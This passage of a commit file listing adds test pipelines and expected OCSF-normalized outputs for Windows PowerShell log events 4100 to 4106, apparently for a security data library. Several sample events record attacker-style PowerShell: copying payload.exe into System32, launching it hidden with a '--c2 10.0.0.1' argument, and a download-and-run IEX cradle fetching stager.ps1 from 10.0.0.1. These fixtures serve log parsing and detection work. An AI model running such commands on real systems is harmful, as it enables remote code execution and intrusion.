      "patch": "@@ -0,0 +1,87 @@\n+{\n+  activity_id: 1,\n+  activity_name: \"Execute\",\n+  actor: {\n+    process: {\n+      cmd_line: \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n+      file: {\n+        type: \"Executable File\",\n+        type_id: 8,\n+      },\n+    },\n+    user: {\n+      domain: \"CORP\",\n+      name: \"jdoe\",\n+    },\n+  },\n+  category_name: \"System Activity\",\n+  category_uid: 1,\n+  class_name: \"Script Activity\",\n+  class_uid: 1009,\n+  device: {\n+    hostname: \"WINHOST01.corp.local\",\n+  },\n+  metadata: {\n+    event_code: \"4100\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"3\",\n+    log_name: \"Microsoft-Windows-PowerShell/Operational\",\n+    log_version: \"1\",\n+    logged_time: 2024-03-23T12:34:56.789012300Z,\n+    original_event_uid: \"20100\",\n+    product: {\n+      name: \"Microsoft-Windows-PowerShell\",\n+      uid: \"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-PowerShell\\\" Guid=\\\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\\\"/>\\n    <EventID>4100</EventID>\\n    <Version>1</Version>\\n    <Level>3</Level>\\n    <Task>1</Task>\\n    <Keywords>0x0</Keywords>\\n    <TimeCreated SystemTime=\\\"2024-03-23T12:34:56.789012300Z\\\"/>\\n    <EventRecordID>20100</EventRecordID>\\n    <Correlation ActivityID=\\\"{abc123-def456}\\\"/>\\n    <Execution ProcessID=\\\"6812\\\" ThreadID=\\\"7120\\\"/>\\n    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>\\n    <Computer>WINHOST01.corp.local</Computer>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"ErrorCode\\\">-2146233087</Data>\\n    <Data Name=\\\"Message\\\">Access to the path 'C:\\\\Windows\\\\System32\\\\payload.exe' is denied.</Data>\\n    <Data Name=\\\"Severity\\\">Error</Data>\\n    <Data Name=\\\"HostName\\\">ConsoleHost</Data>\\n    <Data Name=\\\"HostVersion\\\">5.1.19041.4648</Data>\\n    <Data Name=\\\"HostId\\\">{{a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d}}</Data>\\n    <Data Name=\\\"HostApplication\\\">C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe</Data>\\n    <Data Name=\\\"EngineVersion\\\">5.1.19041.4648</Data>\\n    <Data Name=\\\"RunspaceId\\\">{{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}}</Data>\\n    <Data Name=\\\"PipelineId\\\">2</Data>\\n    <Data Name=\\\"ScriptName\\\"></Data>\\n    <Data Name=\\\"CommandLine\\\">Copy-Item -Path C:\\\\tmp\\\\payload.exe -Destination C:\\\\Windows\\\\System32\\\\</Data>\\n    <Data Name=\\\"CommandInvocation\\\">Copy-Item</Data>\\n    <Data Name=\\\"User\\\">CORP\\\\jdoe</Data>\\n    <Data Name=\\\"ConnectedUser\\\"></Data>\\n    <Data Name=\\\"ShellId\\\">Microsoft.PowerShell</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1600,\n+  script: {\n+    name: \"Copy-Item\",\n+    type: \"PowerShell\",\n+    type_id: 2,\n+  },\n+  severity: \"Low\",\n+  severity_id: 2,\n+  status: \"Failure\",\n+  status_code: \"-2146233087\",\n+  status_detail: \"Access to the path 'C:\\\\Windows\\\\System32\\\\payload.exe' is denied.\",\n+  status_id: 2,\n+  time: 2024-03-23T12:34:56.789012300Z,\n+  type_name: \"Script Activity: Execute\",\n+  type_uid: 100901,\n+  unmapped: {\n+    System: {\n+      Task: 1,\n+      Keywords: \"0x0\",\n+      Correlation: {\n+        ActivityID: \"{abc123-def456}\",\n+      },\n+      Execution: {\n+        ProcessID: 6812,\n+        ThreadID: 7120,\n+      },\n+    },\n+    EventData: {\n+      Severity: \"Error\",\n+      HostVersion: \"5.1.19041.4648\",\n+      HostId: \"{{a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d}}\",\n+      EngineVersion: \"5.1.19041.4648\",\n+      RunspaceId: \"{{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}}\",\n+      PipelineId: 2,\n+      ScriptName: null,\n+      CommandLine: \"Copy-Item -Path C:\\\\tmp\\\\payload.exe -Destination C:\\\\Windows\\\\System32\\\\\",\n+      ShellId: \"Microsoft.PowerShell\",\n+    },\n+  },\n+}"
    },
    {
      "sha": "99bcd54ad67ae007c6809d7e0a0a0a1eda8532fd",
      "filename": "microsoft/tests/ocsf/eid-4103.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4103.tql",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4103.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-4103.tql?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/eid-4103.xml\" {\n+  read_all\n+}\n+microsoft::windows::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "dbcf0bbeae9c5b32888b8be3f2a260a78b44830d",
      "filename": "microsoft/tests/ocsf/eid-4103.txt",
      "status": "added",
      "additions": 62,
      "deletions": 0,
      "changes": 62,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4103.txt",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4103.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-4103.txt?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,62 @@\n+{\n+  activity_id: 1,\n+  activity_name: \"Execute\",\n+  category_name: \"System Activity\",\n+  category_uid: 1,\n+  class_name: \"Script Activity\",\n+  class_uid: 1009,\n+  device: {\n+    hostname: \"WINHOST01.corp.local\",\n+  },\n+  metadata: {\n+    event_code: \"4103\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-PowerShell/Operational\",\n+    log_version: \"1\",\n+    logged_time: 2024-03-23T12:34:56.789012300Z,\n+    original_event_uid: \"20103\",\n+    product: {\n+      name: \"Microsoft-Windows-PowerShell\",\n+      uid: \"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-PowerShell\\\" Guid=\\\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\\\"/>\\n    <EventID>4103</EventID>\\n    <Version>1</Version>\\n    <Level>4</Level>\\n    <Task>1</Task>\\n    <Keywords>0x0</Keywords>\\n    <TimeCreated SystemTime=\\\"2024-03-23T12:34:56.789012300Z\\\"/>\\n    <EventRecordID>20103</EventRecordID>\\n    <Correlation ActivityID=\\\"{abc123-def456}\\\"/>\\n    <Execution ProcessID=\\\"6812\\\" ThreadID=\\\"7120\\\"/>\\n    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>\\n    <Computer>WINHOST01.corp.local</Computer>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"ContextInfo\\\">        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.19041.4648\\n        Host ID = {{a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d}}\\n        Host Application = C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\n        Engine Version = 5.1.19041.4648\\n        Runspace ID = {{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}}\\n        Pipeline ID = 3\\n        Command Name = Invoke-Expression\\n        Command Type = Cmdlet\\n        Script Name =\\n        Command Path =\\n        Sequence Number = 15\\n        User = CORP\\\\jdoe\\n        Connected User =\\n        Shell ID = Microsoft.PowerShell</Data>\\n    <Data Name=\\\"Payload\\\">CommandInvocation(Invoke-Expression): \\\"Invoke-Expression\\\"\\nParameterBinding(Invoke-Expression): name=\\\"Command\\\"; value=\\\"Start-Process -FilePath 'C:\\tmp\\\\payload.exe' -ArgumentList '--c2 10.0.0.1' -WindowStyle Hidden\\\"</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1553,\n+  script: {\n+    type: \"PowerShell\",\n+    type_id: 2,\n+  },\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  time: 2024-03-23T12:34:56.789012300Z,\n+  type_name: \"Script Activity: Execute\",\n+  type_uid: 100901,\n+  unmapped: {\n+    System: {\n+      Task: 1,\n+      Keywords: \"0x0\",\n+      Correlation: {\n+        ActivityID: \"{abc123-def456}\",\n+      },\n+      Execution: {\n+        ProcessID: 6812,\n+        ThreadID: 7120,\n+      },\n+    },\n+    EventData: {\n+      ContextInfo: \"        Severity = Informational        Host Name = ConsoleHost        Host Version = 5.1.19041.4648        Host ID = {{a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d}}        Host Application = C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe        Engine Version = 5.1.19041.4648        Runspace ID = {{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}}        Pipeline ID = 3        Command Name = Invoke-Expression        Command Type = Cmdlet        Script Name =        Command Path =        Sequence Number = 15        User = CORP\\\\jdoe        Connected User =        Shell ID = Microsoft.PowerShell\",\n+      Payload: \"CommandInvocation(Invoke-Expression): \\\"Invoke-Expression\\\"ParameterBinding(Invoke-Expression): name=\\\"Command\\\"; value=\\\"Start-Process -FilePath 'C:\\tmp\\\\payload.exe' -ArgumentList '--c2 10.0.0.1' -WindowStyle Hidden\\\"\",\n+    },\n+  },\n+}"
    },
    {
      "sha": "f316f40b68e8047361ab690b3d99036f3d31825f",
      "filename": "microsoft/tests/ocsf/eid-4104.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4104.tql",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4104.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-4104.tql?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/eid-4104.xml\" {\n+  read_all\n+}\n+microsoft::windows::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "495a6d3d378d0d370009b6bbf3c66984e8cd3b8e",
      "filename": "microsoft/tests/ocsf/eid-4104.txt",
      "status": "added",
      "additions": 65,
      "deletions": 0,
      "changes": 65,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4104.txt",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4104.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-4104.txt?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,65 @@\n+{\n+  activity_id: 1,\n+  activity_name: \"Execute\",\n+  category_name: \"System Activity\",\n+  category_uid: 1,\n+  class_name: \"Script Activity\",\n+  class_uid: 1009,\n+  device: {\n+    hostname: \"WINHOST01.corp.local\",\n+  },\n+  metadata: {\n+    event_code: \"4104\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"3\",\n+    log_name: \"Microsoft-Windows-PowerShell/Operational\",\n+    log_version: \"1\",\n+    logged_time: 2024-03-23T12:34:56.789012300Z,\n+    original_event_uid: \"20104\",\n+    product: {\n+      name: \"Microsoft-Windows-PowerShell\",\n+      uid: \"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-PowerShell\\\" Guid=\\\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\\\"/>\\n    <EventID>4104</EventID>\\n    <Version>1</Version>\\n    <Level>3</Level>\\n    <Task>2</Task>\\n    <Keywords>0x0</Keywords>\\n    <TimeCreated SystemTime=\\\"2024-03-23T12:34:56.789012300Z\\\"/>\\n    <EventRecordID>20104</EventRecordID>\\n    <Correlation ActivityID=\\\"{abc123-def456}\\\"/>\\n    <Execution ProcessID=\\\"6812\\\" ThreadID=\\\"7120\\\"/>\\n    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>\\n    <Computer>WINHOST01.corp.local</Computer>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"MessageNumber\\\">1</Data>\\n    <Data Name=\\\"MessageTotal\\\">1</Data>\\n    <Data Name=\\\"ScriptBlockText\\\">IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/stager.ps1'); Start-Process -FilePath 'C:\\\\tmp\\\\payload.exe' -ArgumentList '--c2 10.0.0.1' -WindowStyle Hidden</Data>\\n    <Data Name=\\\"ScriptBlockId\\\">{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}</Data>\\n    <Data Name=\\\"Path\\\"></Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1061,\n+  script: {\n+    type: \"PowerShell\",\n+    type_id: 2,\n+    uid: \"{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}\",\n+  },\n+  severity: \"Low\",\n+  severity_id: 2,\n+  time: 2024-03-23T12:34:56.789012300Z,\n+  type_name: \"Script Activity: Execute\",\n+  type_uid: 100901,\n+  unmapped: {\n+    System: {\n+      Task: 2,\n+      Keywords: \"0x0\",\n+      Correlation: {\n+        ActivityID: \"{abc123-def456}\",\n+      },\n+      Execution: {\n+        ProcessID: 6812,\n+        ThreadID: 7120,\n+      },\n+    },\n+    EventData: {\n+      MessageNumber: 1,\n+      MessageTotal: 1,\n+      ScriptBlockText: \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/stager.ps1'); Start-Process -FilePath 'C:\\\\tmp\\\\payload.exe' -ArgumentList '--c2 10.0.0.1' -WindowStyle Hidden\",\n+      Path: null,\n+    },\n+  },\n+}"
    },
    {
      "sha": "5312cea8e289f8591cfbc1f630b6c7aded9dcf46",
      "filename": "microsoft/tests/ocsf/eid-4105.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4105.tql",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4105.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-4105.tql?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/eid-4105.xml\" {\n+  read_all\n+}\n+microsoft::windows::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "c230f77d053b807a71b6be60f6c558da279a5001",
      "filename": "microsoft/tests/ocsf/eid-4105.txt",
      "status": "added",
      "additions": 65,
      "deletions": 0,
      "changes": 65,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4105.txt",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4105.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-4105.txt?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,65 @@\n+{\n+  activity_id: 1,\n+  activity_name: \"Execute\",\n+  actor: {\n+    session: {\n+      uid: \"{a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d}\",\n+    },\n+  },\n+  category_name: \"System Activity\",\n+  category_uid: 1,\n+  class_name: \"Script Activity\",\n+  class_uid: 1009,\n+  device: {\n+    hostname: \"WINHOST01.corp.local\",\n+  },\n+  metadata: {\n+    event_code: \"4105\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"5\",\n+    log_name: \"Microsoft-Windows-PowerShell/Operational\",\n+    log_version: \"1\",\n+    logged_time: 2024-03-23T12:34:56.789012300Z,\n+    original_event_uid: \"20105\",\n+    product: {\n+      name: \"Microsoft-Windows-PowerShell\",\n+      uid: \"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-PowerShell\\\" Guid=\\\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\\\"/>\\n    <EventID>4105</EventID>\\n    <Version>1</Version>\\n    <Level>5</Level>\\n    <Task>2</Task>\\n    <Keywords>0x0</Keywords>\\n    <TimeCreated SystemTime=\\\"2024-03-23T12:34:56.789012300Z\\\"/>\\n    <EventRecordID>20105</EventRecordID>\\n    <Correlation ActivityID=\\\"{a1b2c3d4-e5f6-47a8-9c0d-1e2f3a4b5c6d}\\\"/>\\n    <Execution ProcessID=\\\"6812\\\" ThreadID=\\\"7120\\\"/>\\n    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>\\n    <Computer>WINHOST01.corp.local</Computer>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"ScriptBlockId\\\">{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}</Data>\\n    <Data Name=\\\"RunspaceId\\\">{a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d}</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 837,\n+  script: {\n+    type: \"PowerShell\",\n+    type_id: 2,\n+    uid: \"{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}\",\n+  },\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  time: 2024-03-23T12:34:56.789012300Z,\n+  type_name: \"Script Activity: Execute\",\n+  type_uid: 100901,\n+  unmapped: {\n+    System: {\n+      Task: 2,\n+      Keywords: \"0x0\",\n+      Correlation: {\n+        ActivityID: \"{a1b2c3d4-e5f6-47a8-9c0d-1e2f3a4b5c6d}\",\n+      },\n+      Execution: {\n+        ProcessID: 6812,\n+        ThreadID: 7120,\n+      },\n+    },\n+    EventData: {},\n+  },\n+}"
    },
    {
      "sha": "ea479b2ae9f8b7a31d7beaba0ff35e6c66c979c3",
      "filename": "microsoft/tests/ocsf/eid-4106.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4106.tql",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4106.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-4106.tql?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/eid-4106.xml\" {\n+  read_all\n+}\n+microsoft::windows::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "ddca430c7fcdd9a0c1713b1edbde4cae865512e3",
      "filename": "microsoft/tests/ocsf/eid-4106.txt",
      "status": "added",
      "additions": 65,
      "deletions": 0,
      "changes": 65,
      "blob_url": "https://github.com/tenzir/library/blob/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4106.txt",
      "raw_url": "https://github.com/tenzir/library/raw/94f723890ff78a032c30c1653aae5d60a89c673a/microsoft%2Ftests%2Focsf%2Feid-4106.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/microsoft%2Ftests%2Focsf%2Feid-4106.txt?ref=94f723890ff78a032c30c1653aae5d60a89c673a",
      "patch": "@@ -0,0 +1,65 @@\n+{\n+  activity_id: 1,\n+  activity_name: \"Execute\",\n+  actor: {\n+    session: {\n+      uid: \"{a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d}\",\n+    },\n+  },\n+  category_name: \"System Activity\",\n+  category_uid: 1,\n+  class_name: \"Script Activity\",\n+  class_uid: 1009,\n+  device: {\n+    hostname: \"WINHOST01.corp.local\",\n+  },\n+  metadata: {\n+    event_code: \"4106\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"5\",\n+    log_name: \"Microsoft-Windows-PowerShell/Operational\",\n+    log_version: \"1\",\n+    logged_time: 2024-03-23T12:34:56.789012300Z,\n+    original_event_uid: \"20106\",\n+    product: {\n+      name: \"Microsoft-Windows-PowerShell\",\n+      uid: \"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-PowerShell\\\" Guid=\\\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\\\"/>\\n    <EventID>4106</EventID>\\n    <Version>1</Version>\\n    <Level>5</Level>\\n    <Task>2</Task>\\n    <Keywords>0x0</Keywords>\\n    <TimeCreated SystemTime=\\\"2024-03-23T12:34:56.789012300Z\\\"/>\\n    <EventRecordID>20106</EventRecordID>\\n    <Correlation ActivityID=\\\"{a1b2c3d4-e5f6-47a8-9c0d-1e2f3a4b5c6d}\\\"/>\\n    <Execution ProcessID=\\\"6812\\\" ThreadID=\\\"7120\\\"/>\\n    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>\\n    <Computer>WINHOST01.corp.local</Computer>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"ScriptBlockId\\\">{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}</Data>\\n    <Data Name=\\\"RunspaceId\\\">{a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d}</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 837,\n+  script: {\n+    type: \"PowerShell\",\n+    type_id: 2,\n+    uid: \"{f3a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c}\",\n+  },\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  time: 2024-03-23T12:34:56.789012300Z,\n+  type_name: \"Script Activity: Execute\",\n+  type_uid: 100901,\n+  unmapped: {\n+    System: {\n+      Task: 2,\n+      Keywords: \"0x0\",\n+      Correlation: {\n+        ActivityID: \"{a1b2c3d4-e5f6-47a8-9c0d-1e2f3a4b5c6d}\",\n+      },\n+      Execution: {\n+        ProcessID: 6812,\n+        ThreadID: 7120,\n+      },\n+    },\n+    EventData: {},\n+  },\n+}"
    },
